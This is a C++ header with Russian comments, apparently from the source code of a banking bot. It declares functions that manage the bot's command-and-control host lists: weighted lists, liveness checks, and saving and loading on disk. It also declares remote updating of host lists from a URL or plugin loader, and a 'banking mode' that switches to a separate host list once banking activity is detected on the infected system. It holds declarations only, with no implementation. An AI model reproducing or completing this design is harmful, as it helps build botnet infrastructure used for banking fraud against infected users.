//---------------------------------------------------------------------------
//  Модуль для работы с хостами
//---------------------------------------------------------------------------


#ifndef BotHostsH
#define BotHostsH
//---------------------------------------------------------------------------

#include "windows.h"
#include "BotClasses.h"


//----------------------------------------------------
//  Веса списка хостов
//----------------------------------------------------
#define HOSTS_WEIGHT_DEFAULT  0
#define HOSTS_WEIGHT_LOW      1
#define HOSTS_WEIGHT_MIDDLE   100
#define HOSTS_WEIGHT_HIGH     500



//----------------------------------------------------
//  Список хостов
//----------------------------------------------------
typedef struct THostList
{
	DWORD Weight;  // Вес (Приоритет) списка
    PList Items;   // Список элементов (PHost)
} *PHostList;



//----------------------------------------------------
//  Описание хоста
//----------------------------------------------------
typedef DWORD HOSTTIME;

typedef struct THost
{
	DWORD     Status;     // Статус хоста
	HOSTTIME  CheckTime;  // Время последней проверки носта
    PCHAR     Host;       // Адрес хоста
} *PHost;


//****************************************************************************
//  Hosts - Методы для работы с хостами бота
//          В данный момент доступен режим обновления хостов "Банкинг"
//			если выполнить метод обновления хостов без аргументов, то функция
//			скачает один файл nobnk.list. Если включен режим банкинг, то будет закачан
//			другой файл bnk.list
//****************************************************************************
namespace Hosts
{
	//----------------------------------------------------------------
	//  GetFileName - Функция возвращает имя файла основного списка
	//				  хостов бота
	//----------------------------------------------------------------
    PCHAR GetFileName();

	//----------------------------------------------------------------
	//  GetActiveHostFormMainList -  Функция возвращает первый
	//       доступный хост из основного списка хостов лежащего
	//		 на диске
	//
	//  FileName - Имя файла списка. Если передать NULL то будет
	//			   использоваться файл с именем которое возвращает
	//			   функция GetFileName
	//
	//  Host - Переменная, куда будет записан хост
	//         В случае успеха функция создаст строку
	//
	//  Результат: Функция вернёт истину если ей удалось прочитать
	//  		   список с диска и в нём содержится хотя-бы один
	//             хост
	//----------------------------------------------------------------
    bool GetActiveHostFormFile(PCHAR FileName, PCHAR &Host);

	//----------------------------------------------------------------
	//  CheckHost - Функция проверяет работоспособность хоста и
	//              возвращает истину в случае успеха
	//----------------------------------------------------------------
    bool CheckHost(PCHAR Host);

	//----------------------------------------------------------------
	//  CreateList - Функция создаёт список хостов.
	//----------------------------------------------------------------
	PHostList CreateList();

	//----------------------------------------------------------------
	//  FreeList - Функция уничтожает список хостов
	//----------------------------------------------------------------
    void FreeList(PHostList List);

	//----------------------------------------------------------------
	//  ClearList - Функция очищает список хостов
	//----------------------------------------------------------------
    void ClearList(PHostList List);

	//----------------------------------------------------------------
	//  AddHost - Добавить новый хост в список
	//----------------------------------------------------------------
	PHost AddHost(PHostList List, PCHAR Host);

	//----------------------------------------------------------------
	//  SaveListToFile - Функция сохраняет список хостов в файл.
	//		Если файл уже существует, то фунция проверяет вес списка
	//		из файла и если	он больше веса сохраняемого списка, то
	//		функция прервёт свою работу
	//
	//  List - Сохраняемый список
	//
	//  FileName - имя файла, куда необходимо сохранить список
	//
	//  IgnoreWeight - Указание игнорировать вес списка из файла
	//
	//  Результат: Функция вернёт истину в случае успешной записи
	//----------------------------------------------------------------
	bool SaveListToFile(PHostList List, PCHAR FileName, bool IgnoreWeight);

	//----------------------------------------------------------------
	//  LoadListFromFile - Функция загружает список хостов из файла
	//
	//  List - список, куда будут загружены данные из файла
	//
	//  FileName - Имя файла списка
	//
	//  Результат: Функция вернёт истину в случае успешной загрузки
	//----------------------------------------------------------------
	bool LoadListFromFile(PHostList List, PCHAR FileName);


	//----------------------------------------------------------------
	//  Функция возвращает вес списка записанного в файл
	//----------------------------------------------------------------
	bool GetListWeight(HANDLE File, DWORD &Weight);

	//----------------------------------------------------------------
	//  UpdateHosts - Функция загружает список хостов и обновляет файл
	//                на диске
	//
	//  Args - Имя списка хостов.
	//		   Допускаются следующие варианты:
	//			1. Полный адрес списка.
	//			   например UpdateHosts("http://dm.com/hosts.list");
	//
	//		    2. короткое имя файла конфига (плагина). В этом случае
	//			   файл будет загружен через систему загрузки плагинов
	//			   например: UpdateHosts("mainhosts.list");
	//----------------------------------------------------------------
    bool UpdateHosts(PCHAR Args);

	//----------------------------------------------------------------
	//  ExecuteUpdateHostsCommand - функция выполняет команду
	//							   обновления списка хостов
	//----------------------------------------------------------------
	bool ExecuteUpdateHostsCommand(LPVOID TaskManager, PCHAR Command, PCHAR Args);

	//----------------------------------------------------------------
	//  SetBankingMode - Функция включает использования хостов для
	//  				 системы которая поймала банкинг
	//----------------------------------------------------------------
    void SetBankingMode();

}




//---------------------------------------------------------------------------
#endif
